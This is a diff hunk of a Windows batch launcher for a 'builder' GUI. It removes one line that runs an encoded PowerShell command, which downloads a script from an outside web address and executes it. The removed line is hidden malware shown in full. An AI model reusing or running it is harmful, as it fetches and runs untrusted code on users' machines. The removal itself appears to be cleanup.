@@ -42,7 +42,6 @@ if %errorlevel% neq 0 (
 )
 
 cls
-powershell -encodedCommand aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA==
 title Starting builder...
 python gui.py
 if %errorlevel% neq 0 goto ERROR
